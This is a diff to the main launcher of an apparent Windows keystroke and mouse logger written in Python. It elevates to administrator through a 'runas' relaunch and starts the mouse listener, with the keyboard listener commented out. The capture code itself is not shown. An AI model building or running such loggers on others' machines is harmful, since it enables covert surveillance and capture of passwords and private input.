@@ -1,28 +1,30 @@
+import multiprocessing
 from Loggers.KeyLogger import KeyLogger
-from Loggers.ClickLogger import ClickLogger
+from Loggers.MouseLogger import MouseLogger
 from Loggers.Logger import Logger
 import ctypes, sys
 import traceback
 
-class Main(Logger):
+class Main():
     
-    def is_admin(self):
+    def __is_admin(self):
         try:
             return ctypes.windll.shell32.IsUserAnAdmin()
         except:
             return False
 
     def run(self):
+        multiprocessing.freeze_support()
         keylog = KeyLogger()
-        clicklog = ClickLogger()
-        logger = Logger()
+        mouselog = MouseLogger()
+        logger = Logger("")
         
-        if self.is_admin():
+        if self.__is_admin():
             try:
-                keylog.keyboard_listener()
-                # clicklog.mouse_listener()
+                # keylog.keyboard_listener()
+                mouselog.mouse_listener()
             except:
-                logger.log_error(traceback.format_exc()) 
+                logger.error(traceback.format_exc()) 
         else:
             # Re-run the program with admin rights
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
